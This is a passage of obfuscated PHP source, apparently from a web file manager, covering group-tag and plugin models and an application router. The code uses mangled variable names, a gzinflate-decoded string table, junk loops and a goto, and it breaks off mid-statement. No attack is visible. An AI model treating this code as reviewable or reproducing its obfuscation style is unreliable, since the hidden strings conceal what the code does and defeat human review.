$úØı½¹Ï = Model($“ÒËÏÌ[908])->where($…¬£Ú¤Ş)->field($“ÒËÏÌ[2107])->select(); $úØı½¹Ï = array_to_keyvalue($úØı½¹Ï, $“ÒËÏÌ[573], $“ÒËÏÌ[194]); $É¥ç¡Â = !empty($úØı½¹Ï[$Ûóòƒ¸—]) ? $úØı½¹Ï[$Ûóòƒ¸—] : !1; if ($É¥ç¡Â) { if (!$úØı½¹Ï[$œ›«Œ—±]) { $úØı½¹Ï[$œ›«Œ—±] = Model($“ÒËÏÌ[908])->groupRootAdd($œ›«Œ—±); } $í¹Ó°œ = $úØı½¹Ï[$œ›«Œ—±]; $…¬£Ú¤Ş = array($“ÒËÏÌ[193] => $É¥ç¡Â); $úØı½¹Ï = Model($“ÒËÏÌ[908])->where($…¬£Ú¤Ş)->field($“ÒËÏÌ[2108])->select(); if (!$úØı½¹Ï) { $úØı½¹Ï = array(); } Model($“ÒËÏÌ[908])->moveClearAuth = !1; foreach ($úØı½¹Ï as $òš´îñ›) { $ŸÖ«•¡é = $òš´îñ›[$“ÒËÏÌ[487]] == $“ÒËÏÌ[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($“ÒËÏÌ[908])->move($òš´îñ›[$“ÒËÏÌ[194]], $í¹Ó°œ, $ŸÖ«•¡é); } Model($“ÒËÏÌ[908])->moveClearAuth = !0; $…¬£Ú¤Ş = array($“ÒËÏÌ[191] => 2, $“ÒËÏÌ[573] => $Ûóòƒ¸—); $ˆ¼ŠÙ¥à = array($“ÒËÏÌ[573] => $œ›«Œ—±); Model($“ÒËÏÌ[2109])->where($…¬£Ú¤Ş)->save($ˆ¼ŠÙ¥à); Model($“ÒËÏÌ[2110])->where($…¬£Ú¤Ş)->save($ˆ¼ŠÙ¥à); } $this->_changeChildLevel($†ÏŸåµ×[$Ûóòƒ¸—], $†ÏŸåµ×[$œ›«Œ—±], !0); $this->where(array($“ÒËÏÌ[193] => $Ûóòƒ¸—))->save(array($“ÒËÏÌ[193] => $œ›«Œ—±)); $this->_clearChildrenCache($†ÏŸåµ×[$œ›«Œ—±]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\162\x5f\x66\x61\166"; protected function cacheFunctionAlias($…ÍÖ™Ù‰) { $ÇœùÊ =& $_SERVER[ùèÅ´Ãš]; return array($ÇœùÊ[2111] => array($…ÍÖ™Ù‰[0], $ÇœùÊ[2112]), $ÇœùÊ[2113] => array($…ÍÖ™Ù‰[0], $ÇœùÊ[2114])); } protected function get($˜«²Ñìá) { $‹Æ„êç§ =& $_SERVER[ùèÅ´Ãš]; $ĞŸ§‡‡ = Model($‹Æ„êç§[589])->metaGet($˜«²Ñìá, $‹Æ„êç§[2115]); $ÒóºÄ‰ = json_decode($ĞŸ§‡‡, !0); return $ÒóºÄ‰ ? $ÒóºÄ‰ : array($‹Æ„êç§[2116] => $‹Æ„êç§[91], $‹Æ„êç§[447] => array()); } protected function set($•Ïİ¬©ë, $ £„¸Õ) { $ˆÆÂçøÈ =& $_SERVER[ùèÅ´Ãš]; $ £„¸Õ = $ £„¸Õ ? $ £„¸Õ : array($ˆÆÂçøÈ[2116] => $ˆÆÂçøÈ[91], $ˆÆÂçøÈ[447] => array()); return Model($ˆÆÂçøÈ[589])->metaSet($•Ïİ¬©ë, $ˆÆÂçøÈ[2115], json_encode($ £„¸Õ)); } protected function getByTagID($Á®âî, $şıåü) { $”È› ‹å =& $_SERVER[ùèÅ´Ãš]; if (!$Á®âî || !$şıåü) { return !1; } if (!Model($”È› ‹å[589])->getInfoSimple($Á®âî)) { return !1; } $ÅªÊì»· = $this->get($Á®âî); if (!$ÅªÊì»· || !isset($ÅªÊì»·[$”È› ‹å[447]])) { return !1; } $¡Òéƒ¿» = array_find_by_field($ÅªÊì»·[$”È› ‹å[447]], $”È› ‹å[477], $şıåü); return is_array($¡Òéƒ¿») ? $¡Òéƒ¿» : !1; } public function listSource($Úûç·²¬, $çøš®Î×) { $ÁÀœ´ =& $_SERVER[ùèÅ´Ãš]; if ($çøš®Î× && !is_array($çøš®Î×)) { $çøš®Î× = array($çøš®Î×); } $¼‰áù¥× = $this->listData($Úûç·²¬); $Ää´£¢ = array(); foreach ($¼‰áù¥× as $“ŠÈòÏê) { $Í¯ğáñè = $“ŠÈòÏê[$ÁÀœ´[87]]; if (!$Í¯ğáñè) { continue; } if (!isset($Ää´£¢[$Í¯ğáñè])) { $Ää´£¢[$Í¯ğáñè] = array(); } $Ää´£¢[$Í¯ğáñè][] = $“ŠÈòÏê[$ÁÀœ´[502]]; } $–èì‹ôâ = array(); foreach ($Ää´£¢ as $ÙÒéñ”® => $ùÊæÜöÏ) { $Ã©à× = !0; if (!$çøš®Î×) { $–èì‹ôâ[] = $ÙÒéñ”®; continue; } foreach ($çøš®Î× as $ØÁÕ¦¼÷) { if (!in_array($ØÁÕ¦¼÷, $ùÊæÜöÏ)) { $Ã©à× = !1; break; } } if ($Ã©à×) { $–èì‹ôâ[] = $ÙÒéñ”®; } } if (!$–èì‹ôâ) { return array(); } $‡‰Ôšà– = array($ÁÀœ´[493] => array($ÁÀœ´[494], $–èì‹ôâ), $ÁÀœ´[573] => $Úûç·²¬, $ÁÀœ´[191] => SourceModel::TYPE_GROUP); $ÜÀğõãö = Model($ÁÀœ´[1442])->listSource($‡‰Ôšà–); if (!$ÜÀğõãö || count($–èì‹ôâ) == $ÜÀğõãö[$ÁÀœ´[444]][$ÁÀœ´[445]]) { return $ÜÀğõãö; } $íµü¦“¹ = array(); $ó©¤ú” = array_to_keyvalue($ÜÀğõãö[$ÁÀœ´[85]], $ÁÀœ´[12], $ÁÀœ´[194]); $¾ù°²Ü„ = array_to_keyvalue($ÜÀğõãö[$ÁÀœ´[86]], $ÁÀœ´[12], $ÁÀœ´[194]); $ğå¤Ÿ¿’ = array_merge($¾ù°²Ü„, $ó©¤ú”); foreach ($–èì‹ôâ as $Í¯ğáñè) { if (!in_array($Í¯ğáñè, $ğå¤Ÿ¿’)) { $íµü¦“¹[] = $Í¯ğáñè; } } if ($íµü¦“¹) { $this->removeBySource($Úûç·²¬, $íµü¦“¹); } return $ÜÀğõãö; } protected function listData($ÆïŞµÒõ) { $¬”³œ =& $_SERVER[ùèÅ´Ãš]; $™Ë£ØÉ¸ = array($¬”³œ[1788] => 0, $¬”³œ[561] => array($¬”³œ[2117], 0), $¬”³œ[498] => $¬”³œ[1400] . $ÆïŞµÒõ); $¶ÍÊ¶¦î = $¬”³œ[2118]; $¤üÖ¸ë = $this->field($¶ÍÊ¶¦î)->where($™Ë£ØÉ¸)->order($¬”³œ[2119])->select(); return $¤üÖ¸ë ? $¤üÖ¸ë : array(); } protected function addToTag($ŠĞş‰à, $°«ŞœÜ‡, $¦üõï®) { $ÀÀÊû”Ë =& $_SERVER[ùèÅ´Ãš]; if (!$this->getByTagID($ŠĞş‰à, $¦üõï®) || !$°«ŞœÜ‡) { return !1; } if (!Model($ÀÀÊû”Ë[908])->pathInfo($°«ŞœÜ‡)) { return !1; } $Óé·æëª = array($ÀÀÊû”Ë[1788] => 0, $ÀÀÊû”Ë[561] => $¦üõï®, $ÀÀÊû”Ë[497] => $°«ŞœÜ‡, $ÀÀÊû”Ë[498] => $ÀÀÊû”Ë[2120] . $ŠĞş‰à, $ÀÀÊû”Ë[496] => $ÀÀÊû”Ë[12], $ÀÀÊû”Ë[2001] => 0); if ($this->where($Óé·æëª)->find()) { return !1; } return $this->add($Óé·æëª); } protected function removeFromTag($€˜¸À†ª, $·Úöü˜¹, $­—Óñª) { $ìßÆ¬©ê =& $_SERVER[ùèÅ´Ãš]; if (!$this->getByTagID($€˜¸À†ª, $­—Óñª) || !$·Úöü˜¹) { return !1; } if (is_array($·Úöü˜¹)) { $·Úöü˜¹ = array($ìßÆ¬©ê[7], $·Úöü˜¹); } $ßÔâ±®ª = array($ìßÆ¬©ê[1788] => 0, $ìßÆ¬©ê[561] => $­—Óñª, $ìßÆ¬©ê[498] => $ìßÆ¬©ê[2120] . $€˜¸À†ª, $ìßÆ¬©ê[497] => $·Úöü˜¹); return $this->where($ßÔâ±®ª)->delete(); } protected function removeByTag($‡ „•âà, $½İîú’¶) { $çßÀÑ…ë =& $_SERVER[ùèÅ´Ãš]; if (!$this->getByTagID($‡ „•âà, $½İîú’¶)) { return !1; } $‚ÜÁ‰²» = array($çßÀÑ…ë[1788] => 0, $çßÀÑ…ë[561] => $½İîú’¶, $çßÀÑ…ë[498] => $çßÀÑ…ë[2120] . $‡ „•âà); return $this->where($‚ÜÁ‰²»)->delete(); } protected function removeBySource($îÙİ½¼¦, $‘õ‡»øı) { $ÖıøØØŞ =& $_SERVER[ùèÅ´Ãš]; if (!$îÙİ½¼¦ || !$‘õ‡»øı) { return !1; } if (is_array($‘õ‡»øı)) { $‘õ‡»øı = array($ÖıøØØŞ[7], $‘õ‡»øı); } $ˆŒÛÈöı = array($ÖıøØØŞ[1788] => 0, $ÖıøØØŞ[497] => $‘õ‡»øı, $ÖıøØØŞ[561] => array($ÖıøØØŞ[1102], 0), $ÖıøØØŞ[498] => $ÖıøØØŞ[2120] . $îÙİ½¼¦); return $this->where($ˆŒÛÈöı)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\x2e\160\x6c\165\147\151\x6e\x4c\x69\x73\164"; public $field = array("\156\141\x6d\145", "\x73\x74\141\x74\165\163", "\162\145\147\151\x65\163\164", "\143\157\x6e\146\151\x67"); public function loadList($»“äµÁ = false) { $ğ…³“¾Ñ = array_to_keyvalue($this->listData(), $_SERVER[ùèÅ´Ãš][32]); if ($»“äµÁ) { return $ğ…³“¾Ñ[$»“äµÁ]; } return $ğ…³“¾Ñ; } public function init() { $Òîåë =& $_SERVER[ùèÅ´Ãš]; Hook::trigger($Òîåë[2121]); $Ö×‹›öÖ = $this->loadPluginList(); foreach ($Ö×‹›öÖ as $ÊÂš¬ => $¯§Ëú¾´) { $áĞ­¸×Ø = $this->appAllow($ÊÂš¬, $¯§Ëú¾´); if (!$áĞ­¸×Ø) { continue; } foreach ($¯§Ëú¾´[$Òîåë[2122]] as $ÙğœÁ¹Ü => $•µ± ”) { Hook::bind($ÙğœÁ¹Ü, $•µ± ”); } } Hook::trigger($Òîåë[2123]); Hook::trigger(ACTION); } public function appAllow($±•Í©òµ, $ÜÌé›ùñ, $Éì‚Ë³© = true) { $²µùÊ¬Ã =& $_SERVER[ùèÅ´Ãš]; $š¸º£È = PLUGIN_DIR . $±•Í©òµ . $²µùÊ¬Ã[2124]; if (!is_array($ÜÌé›ùñ) || !is_array($ÜÌé›ùñ[$²µùÊ¬Ã[2122]]) || $ÜÌé›ùñ[$²µùÊ¬Ã[827]] != 1 || !is_file($š¸º£È)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$²µùÊ¬Ã[6]][$²µùÊ¬Ã[2125]] || !$GLOBALS[$²µùÊ¬Ã[6]][$²µùÊ¬Ã[2126]]) { return !0; } $£¦´Ş× = explode($²µùÊ¬Ã[50], strtolower($GLOBALS[$²µùÊ¬Ã[6]][$²µùÊ¬Ã[2126]])); return in_array(strtolower($±•Í©òµ), $£¦´Ş×) ? !1 : !0; } if ($Éì‚Ë³© && !Action($²µùÊ¬Ã[2127])->checkAuth($±•Í©òµ)) { return !1; } return !0; } public function unInstall($†¹ûÂ¬) { $¾šëïÉÏ =& $_SERVER[ùèÅ´Ãš]; $¼ÕÈş¼ = $this->loadList($†¹ûÂ¬); if (file_exists(PLUGIN_DIR . $†¹ûÂ¬)) { Hook::apply($†¹ûÂ¬ . $¾šëïÉÏ[2128]); } $this->remove($¼ÕÈş¼[$¾šëïÉÏ[477]]); } public function changeStatus($ØõÁ±Æ, $÷…¸¡óû) { $Œˆ¯¬æ =& $_SERVER[ùèÅ´Ãš]; $¡í­¦Çò = $this->loadList($ØõÁ±Æ); if ($÷…¸¡óû) { Hook::apply($ØõÁ±Æ . $Œˆ¯¬æ[2129]); } $this->update($¡í­¦Çò[$Œˆ¯¬æ[477]], array($Œˆ¯¬æ[2130] => $÷…¸¡óû)); } public function appRegist($ò µ½›„, $ËãÀâĞ­) { $ùºÜ¡¼š =& $_SERVER[ùèÅ´Ãš]; $€ù— †Ü = $this->loadList($ò µ½›„); if ($€ù— †Ü) { $this->update($€ù— †Ü[$ùºÜ¡¼š[477]], array($ùºÜ¡¼š[2122] => $ËãÀâĞ­)); } else { $î×èºÌ‚ = array($ùºÜ¡¼š[32] => $ò µ½›„, $ùºÜ¡¼š[2122] => $ËãÀâĞ­, $ùºÜ¡¼š[827] => 0, $ùºÜ¡¼š[6] => $this->getConfigDefault($ò µ½›„)); $this->insert($î×èºÌ‚); } } public function getConfigDefault($§•íÂ¢) { $òçÊÍ‹à =& $_SERVER[ùèÅ´Ãš]; $ßÏòÛÄ” = array(); $øõ¼¸á€ = $this->getPackageJson($§•íÂ¢); if (!$øõ¼¸á€ && is_array($øõ¼¸á€[$òçÊÍ‹à[2131]])) { return $ßÏòÛÄ”; } foreach ($øõ¼¸á€[$òçÊÍ‹à[2131]] as $ °¹£ù => $Àëë±…») { if (!isset($Àëë±…»[$òçÊÍ‹à[452]]) || isset($ßÏòÛÄ”[$ °¹£ù])) { continue; } $ßÏòÛÄ”[$ °¹£ù] = $Àëë±…»[$òçÊÍ‹à[452]]; } return $ßÏòÛÄ”; } public function getPackageJson($±šæÉ¨…) { return Hook::apply($±šæÉ¨… . $_SERVER[ùèÅ´Ãš][2132]); } public function getConfig($ İÚßÓ, $Âõ¬áÓö = false) { $„ °¼ÖÒ =& $_SERVER[ùèÅ´Ãš]; $•Üçâ¤ = array(); $ÂŸ–¡ë× = $this->loadList($ İÚßÓ); if ($ÂŸ–¡ë× && is_array($ÂŸ–¡ë×[$„ °¼ÖÒ[6]])) { $•Üçâ¤ = $ÂŸ–¡ë×[$„ °¼ÖÒ[6]]; } if (!$•Üçâ¤ || $Âõ¬áÓö) { $•Üçâ¤ = $this->getConfigDefault($ İÚßÓ); } return $•Üçâ¤; } public function setConfig($şå¾îÀ‹, $ŞÈ»”À€ = false) { $¨í¸æ·İ =& $_SERVER[ùèÅ´Ãš]; $Ú«ÂÀÙ“ = $this->loadList($şå¾îÀ‹); if (!$Ú«ÂÀÙ“) { return !1; } $µ÷¶  = $Ú«ÂÀÙ“[$¨í¸æ·İ[6]]; if ($ŞÈ»”À€ == !1) { $µ÷¶  = array(); $ŞÈ»”À€ = $this->getConfigDefault($şå¾îÀ‹); } foreach ($ŞÈ»”À€ as $”¯ñü• => $‡ÜïÛÜ) { $µ÷¶ [$”¯ñü•] = is_string($‡ÜïÛÜ) ? trim($‡ÜïÛÜ) : $‡ÜïÛÜ; } $this->update($Ú«ÂÀÙ“[$¨í¸æ·İ[477]], array($¨í¸æ·İ[6] => $µ÷¶ )); } public function viewList() { $õ¨ÄÉó§ =& $_SERVER[ùèÅ´Ãš]; $Ä±‘“Ş = $this->loadList(); $this->pluginScan($Ä±‘“Ş); $Ä±‘“Ş = $this->loadPluginList(); $‚ÁËˆæ” = array(); foreach ($Ä±‘“Ş as $ôâéÒŒœ => $­ñ†øéò) { $ğç—öÎë = $­ñ†øéò; unset($­ñ†øéò[$õ¨ÄÉó§[2122]], $­ñ†øéò[$õ¨ÄÉó§[6]]); $‚Ñè½ = PLUGIN_DIR . $­ñ†øéò[$õ¨ÄÉó§[32]] . $õ¨ÄÉó§[2124]; if (!is_file($‚Ñè½)) { continue; } $ñéµò‘ = Hook::apply($­ñ†øéò[$õ¨ÄÉó§[32]] . $õ¨ÄÉó§[2132]); if (!is_array($ñéµò‘)) { continue; } $‚ÁËˆæ”[$ôâéÒŒœ] = array_merge($­ñ†øéò, $ñéµò‘); if ($ğç—öÎë[$õ¨ÄÉó§[6]][$õ¨ÄÉó§[1708]] != $ñéµò‘[$õ¨ÄÉó§[1682]]) { Hook::apply($­ñ†øéò[$õ¨ÄÉó§[32]] . $õ¨ÄÉó§[2129]); $ğç—öÎë[$õ¨ÄÉó§[6]][$õ¨ÄÉó§[1708]] = $ñéµò‘[$õ¨ÄÉó§[1682]]; $this->update($­ñ†øéò[$õ¨ÄÉó§[477]], array($õ¨ÄÉó§[6] => $ğç—öÎë[$õ¨ÄÉó§[6]])); } } return $‚ÁËˆæ”; } private function loadPluginList() { $âåâ­ =& $_SERVER[ùèÅ´Ãš]; $‰ì‰’‡Ì = $this->loadList(); if (strtolower(MOD) == $âåâ­[2133]) { return $‰ì‰’‡Ì; } $å¨—Ú·œ = Hook::trigger($âåâ­[2134], $‰ì‰’‡Ì); if ($‰ì‰’‡Ì && !$å¨—Ú·œ) { die; } return $å¨—Ú·œ ? $å¨—Ú·œ : $‰ì‰’‡Ì; } private function pluginScan($ˆİõ½²Ì) { $«®ÈÀÛ =& $_SERVER[ùèÅ´Ãš]; recursion_dir(PLUGIN_DIR, $ÊôŞƒé, $ ºùŒ¿, 0); foreach ($ÊôŞƒé as $’°ÕšÓÙ) { $ÔˆàúÜ‘ = get_path_this($’°ÕšÓÙ); if (isset($ˆİõ½²Ì[$ÔˆàúÜ‘]) || !file_exists($’°ÕšÓÙ . $«®ÈÀÛ[2135]) || !file_exists($’°ÕšÓÙ . $«®ÈÀÛ[2124])) { continue; } Hook::apply($ÔˆàúÜ‘ . $«®ÈÀÛ[2129]); } } } goto BÚ¬¬ÏÂÄ”; EÏá·æ¿Î²: $_SERVER[å‚ŞÇ•] = explode($_SERVER[ùèÅ´Ãš][687], gzinflate(substr($_SERVER[ùèÅ´Ãš][688], 10, -8))); $qgiftbspcx = $_SERVER[ùèÅ´Ãš][689]; class Application { private $defaultModule = "\151\x6e\144\x65\x78"; private $defaultController = "\x69\156\144\x65\170"; private $defaultAction = "\x69\156\144\x65\x78"; function __construct() { } public function setDefault($ÁĞÅ´Å) { $èã¶²á =& $_SERVER[å‚ŞÇ•]; $Õ¼®ŠÊ® = explode($èã¶²á[0], trim($ÁĞÅ´Å, $èã¶²á[0])); $this->defaultModule = $Õ¼®ŠÊ®[0] ? $Õ¼®ŠÊ®[0] : $this->defaultModule; $Éú†²šå = $_SERVER[ùèÅ´Ãš][690]; $this->defaultController = $Õ¼®ŠÊ®[1] ? $Õ¼®ŠÊ®[1] : $this->defaultController; $this->defaultAction = $Õ¼®ŠÊ®[2] ? $Õ¼®ŠÊ®[2] : $this->defaultAction; $this->oescce97384b($èã¶²á[1], array($this, $èã¶²á[2])); } public function appRun($Ô½íà†«) { $™ßİ¤ü  =& $_SERVER[ùèÅ´Ãš]; $»¨·­â =& $_SERVER[å‚ŞÇ•]; $º†Õ¤µß = explode($»¨·­â[0], $Ô½íà†«); $‘¨„ô­æ = strtolower($º†Õ¤µß[0]); $ÒÈÄŸà’ = $™ßİ¤ü [691]; $¥üÖÜñ½ = $»¨·­â[3]; $€èæŞò = $™ßİ¤ü [692]; while ($€èæŞò < $™ßİ¤ü [693]) { if ($€èæŞò >= 0) { break; } $€èæŞò++; } if ($‘¨„ô­æ == $»¨·­â[4]) { $¥üÖÜñ½ = $»¨·­â[5]; $º†Õ¤µß[0] = $»¨·­â[6]; $º†Õ¤µß[1] = $º†Õ¤µß[1] . $»¨·­â[7]; $Ô½íà†« = join($»¨·­â[0], $º†Õ¤µß); $Ô½íà†« = trim($Ô½íà†«, $»¨·­â[0]); } call_user_func(array($»¨·­â[8], $»¨·­â[9]), $¥üÖÜñ½ . $»¨·­â[10], $Ô½íà†«); ActionCall($Ô½íà†«); call_user_func(array($»¨·­â[8], $»¨·­â[9]), $¥üÖÜñ½ . $»¨·­â[11], $Ô½íà†«); $–»Ğ¹ú = $™ßİ¤ü [694]; if (strlen($–»Ğ¹ú) < $™ßİ¤ü [695]) { die; } } private function autorun() { $âƒ³ØÂş =& $_SERVER[ùèÅ´Ãš]; $ŸÆ±ã =& $_SERVER[å‚ŞÇ•]; global $config; if (count($config[$ŸÆ±ã[12]]) == 0) { return; } foreach ($config[$ŸÆ±ã[12]] as $Áº‡äŸÁ => $ü£¬—·ä) { $this->appRun($ü£¬—·ä); $Á°†Õ…ë = $âƒ³ØÂş[696]; while ($Á°†Õ…ë < $âƒ³ØÂş[697]) { if ($Á°†Õ…ë >= 0) { break; } $Á°†Õ…ë++; } } } private function gnokfcdca04d() { $æ‚ŸÅÎÀ =& $_SERVER[ùèÅ´Ãš]; $¬ã°‡¦¯ =& $_SERVER[å‚ŞÇ•]; $ôı¤ë = $¬ã°‡¦¯[4]; $ÈÍÂœ  = $GLOBALS[$¬ã°‡¦¯[13]][$¬ã°‡¦¯[14]][0]; if (!$ÈÍÂœ  || strlen($ÈÍÂœ ) <= strlen($ôı¤ë)) { return; } if (strtolower(substr($ÈÍÂœ , -strlen($ôı¤ë))) != $ôı¤ë) { return; } $¡ÍØ„Ø¹ = substr($ÈÍÂœ , 0, -strlen($ôı¤ë)); $äÓÕëĞ¼ = array($¬ã°‡¦¯[4], $¡ÍØ„Ø¹); $“ë¢°¬Ê = array_slice($GLOBALS[$¬ã°‡¦¯[13]][$¬ã°‡¦¯[14]], 1); $GLOBALS[$¬ã°‡¦¯[13]][$¬ã°‡¦¯[14]] = array_merge($äÓÕëĞ¼, $“ë¢°¬Ê); $âÕ¤×…Â = $æ‚ŸÅÎÀ[696]; $GLOBALS[$¬ã°‡¦¯[13]][$¬ã°‡¦¯[15]] = implode($¬ã°‡¦¯[0], $GLOBALS[$¬ã°‡¦¯[13]][$¬ã°‡¦¯[14]]); $˜ÜùøÔ¸ = $æ‚ŸÅÎÀ[698]; while (strlen($˜ÜùøÔ¸) < $æ‚ŸÅÎÀ[693]) { if (!$˜ÜùøÔ¸) { break; } $˜ÜùøÔ¸++; } } private function wtgi6ec803af() { $µ¿ñŠî =& $_SERVER[ùèÅ´Ãš]; $ ßÌÊÛ› =& $_SERVER[å‚ŞÇ•]; if ($GLOBALS[$ ßÌÊÛ›[13]][$ ßÌÊÛ›[15]] != $ ßÌÊÛ›[6]) { return; } $ï¤¯†ó = $_SERVER[$ ßÌÊÛ›[16]]; $•èÆ¤ú£ = $µ¿ñŠî[699]; if (strlen($•èÆ¤ú£) < $µ¿ñŠî[700]) { return; } $¹‡Ñ„Ê = $ ßÌÊÛ›[17]; $“ìæÛ€¸ = $µ¿ñŠî[701]; if (strlen($“ìæÛ€¸) < $µ¿ñŠî[697]) { die; } if (!strstr($ï¤¯†ó, $¹‡Ñ„Ê)) { return; } $ëôÓİå = strrpos($ï¤¯†ó, $¹‡Ñ„Ê); $Ì”Â¾Ø° = substr($ï¤¯†ó, $ëôÓİå + strlen($¹‡Ñ„Ê)); $Ï‡Õğ¡÷ = $µ¿ñŠî[702]; if (!$Ï‡Õğ¡÷) { return; } preg_match_all($ ßÌÊÛ›[18], $Ì”Â¾Ø°, $“Ñ¦Ğºö); $Ì”Â¾Ø° = trim($“Ñ¦Ğºö[0][0], $ ßÌÊÛ›[19]); $Àß–ë¥ = $µ¿ñŠî[703]; if (strlen($Àß–ë¥) < $µ¿ñŠî[704]) { return; } $GLOBALS[$ ßÌÊÛ›[13]][$ ßÌÊÛ›[14]] = explode($ ßÌÊÛ›[19], $Ì”Â¾Ø°); $GLOBALS[$ ßÌÊÛ›[13]][$ ßÌÊÛ›[15]] = implode($ ßÌÊÛ›[0], $GLOBALS[$ ßÌÊÛ›[13]][$ ßÌÊÛ›[14]]); $ıàÕ¢Ô = $µ¿ñŠî[705]; if (!$ıàÕ¢Ô) { die; } } public function run() { $æÇ…Ë‚º =& $_SERVER[ùèÅ´Ãš]; $äŸ¶Îšç =& $_SERVER[å‚ŞÇ•]; $this->wtgi6ec803af(); $á«ñ™ô© = $æÇ…Ë‚º[706]; if (!$á«ñ™ô©) { die; } $this->gnokfcdca04d(); $Ÿ ê´„° = $GLOBALS[$äŸ¶Îšç[13]][$äŸ¶Îšç[14]]; $©ôÙó¾ = $GLOBALS[$äŸ¶Îšç[13]][$äŸ¶Îšç[15]]; $Ø»‹—­ö = $æÇ…Ë‚º[707]; define($äŸ¶Îšç[20], isset($Ÿ ê´„°[0]) && $Ÿ ê´„°[0] ? $Ÿ ê´„°[0] : $this->defaultModule); define($äŸ¶Îšç[21], isset($Ÿ ê´„°[1]) && $Ÿ ê´„°[0] ? $Ÿ ê´„°[1] : $this->defaultController); define($äŸ¶Îšç[22], isset($Ÿ ê´„°[2]) && $Ÿ ê´„°[0] ? $Ÿ ê´„°[2] : $this->defaultAction); define($äŸ¶Îšç[23], MOD . $äŸ¶Îšç[0] . ST . $äŸ¶Îšç[0] . ACT); $û¡İŠş‰ = $æÇ…Ë‚º[708]; while (strlen($û¡İŠş‰) < $æÇ…Ë‚º[693]) { if (!$û¡İŠş‰) { break; } $û¡İŠş‰++; } $_SERVER[$äŸ¶Îšç[24]] = strtolower(ACTION); $this->autorun(); $÷ëÌó´ô = $æÇ…Ë‚º[709]; if (strlen($÷ëÌó´ô) < $æÇ…Ë‚º[704]) { return; } if (count($Ÿ ê´„°) >= 3) { $this->appRun($©ôÙó¾); } else { $this->appRun(ACTION); } } private $gkzn312c58de = array(); private $tschfe659f74 = ''; public function apkb8bc6aefa() { $¡öğ„°½ =& $_SERVER[ùèÅ´Ãš]; $Üïçµ­ş =& $_SERVER[å‚ŞÇ•]; $this->feaq837e1da8(); $this->jard8ab38f80(); $this->vdpg424ca0ea(); $this->tnxr37359f2c(); $this->ibnd3668d59f(); $this->joqc3cd4ee9a(); $this->zwfm526df5e1(); $â€‰“†Å = $¡öğ„°½[710]; if (strlen($â€‰“†Å) < $¡öğ„°½[700]) { return; } $this->oescce97384b($Üïçµ­ş[25], array($this, $Üïçµ­ş[26])); $É–ñ˜­ƒ = $¡öğ„°½[711]; if (strlen($É–ñ˜­ƒ) < $¡öğ„°½[693]) { return; } $this->oescce97384b($Üïçµ­ş[27], array($this, $Üïçµ­ş[28])); $™ŠÒô™™ = $¡öğ„°½[712]; if (!$™ŠÒô™™) { die; } $this->oescce97384b($Üïçµ­ş[29], array($this, $Üïçµ­ş[30])); $this->oescce97384b($Üïçµ­ş[31], array($this, $Üïçµ­ş[32])); $©ÈŒ¿ï÷ = $¡öğ„°½[713]; while (strlen($©ÈŒ¿ï÷) < $¡öğ„°½[700]) { if (!$©ÈŒ¿ï÷) { break; } $©ÈŒ¿ï÷++; } } public function lvys8a32fcb6($ÛÁì§ÓÖ) { $Ü¶òñº³ =& $_SERVER[ùèÅ´Ãš]; $ÎöÙüü‹ =& $_SERVER[å‚ŞÇ•]; $®Íñ·¾Æ = Model($ÎöÙüü‹[33])->get(); $×ì£Ş¿Ç = array($ÎöÙüü‹[34], $ÎöÙüü‹[35], $ÎöÙüü‹[36], $ÎöÙüü‹[37], $ÎöÙüü‹[38], $ÎöÙüü‹[39], $ÎöÙüü‹[40], $ÎöÙüü‹[41], $ÎöÙüü‹[42], $ÎöÙüü‹[43], $ÎöÙüü‹[44], $ÎöÙüü‹[45], $ÎöÙüü‹[46], $ÎöÙüü‹[47], $ÎöÙüü‹[48], $ÎöÙüü‹[49], $ÎöÙüü‹[50], $ÎöÙüü‹[51], $ÎöÙüü‹[52], $ÎöÙüü‹[53], $ÎöÙüü‹[54], $ÎöÙüü‹[55], $ÎöÙüü‹[56], $ÎöÙüü‹[57], $ÎöÙüü‹[58], $ÎöÙüü‹[59], $ÎöÙüü‹[60], $ÎöÙüü‹[61], $ÎöÙüü‹[62], $ÎöÙüü‹[63], $ÎöÙüü‹[64], $ÎöÙüü‹[65], $ÎöÙüü‹[66], $ÎöÙüü‹[67], $ÎöÙüü‹[68], $ÎöÙüü‹[69], $ÎöÙüü‹[70], $ÎöÙüü‹[71], $ÎöÙüü‹[72], $ÎöÙüü‹[73], $ÎöÙüü‹[74], $ÎöÙüü‹[75], $ÎöÙüü‹[76], $ÎöÙüü‹[77], $ÎöÙüü‹[78], $ÎöÙüü‹[79], $ÎöÙüü‹[80], $ÎöÙüü‹[81], $ÎöÙüü‹[82], $ÎöÙüü‹[83], $ÎöÙüü‹[84], $ÎöÙüü‹[85]); $§…ñ € = $Ü¶òñº³[712]; if (!$§…ñ €) { return; } foreach ($×ì£Ş¿Ç as $ÒÙºÒÌ) { $¼Û¡ÀÀñ = $GLOBALS[$ÎöÙüü‹[86]][$ÎöÙüü‹[87]][$ÒÙºÒÌ]; $Ççñäè¸ = $Ü¶òñº³[714]; if (strlen($Ççñäè¸) < $Ü¶òñº³[697]) { return; } if (isset($®Íñ·¾Æ[$ÒÙºÒÌ])) { $¼Û¡ÀÀñ = $®Íñ·¾Æ[$ÒÙºÒÌ]; } $ÛÁì§ÓÖ[$ÎöÙüü‹[88]][$ÎöÙüü‹[89]][$ÒÙºÒÌ] = $¼Û¡ÀÀñ; } $—ÍÒñó = $ÛÁì§ÓÖ[$ÎöÙüü‹[88]][$ÎöÙüü‹[89]][$ÎöÙüü‹[46]]; $ãÌ¹ªêı = $Ü¶òñº³[715]; if (strlen($ãÌ¹ªêı) < $Ü¶òñº³[704]) { die; } unset($ÛÁì§ÓÖ[$ÎöÙüü‹[88]][$ÎöÙüü‹[90]][$ÎöÙüü‹[91]]); unset($ÛÁì§ÓÖ[$ÎöÙüü‹[88]][$ÎöÙüü‹[90]][$ÎöÙüü‹[92]]); $ŒôâË“’ = $Ü¶òñº³[716]; unset($ÛÁì§ÓÖ[$ÎöÙüü‹[88]][$ÎöÙüü‹[89]][$ÎöÙüü‹[46]]); unset($ÛÁì§ÓÖ[$ÎöÙüü‹[88]][$ÎöÙüü‹[89]][$ÎöÙüü‹[93]]); $ÛÁì§ÓÖ[$ÎöÙüü‹[88]][$ÎöÙüü‹[89]][$ÎöÙüü‹[94]] = array($ÎöÙüü‹[95] => (int) $—ÍÒñó[$ÎöÙüü‹[96]], 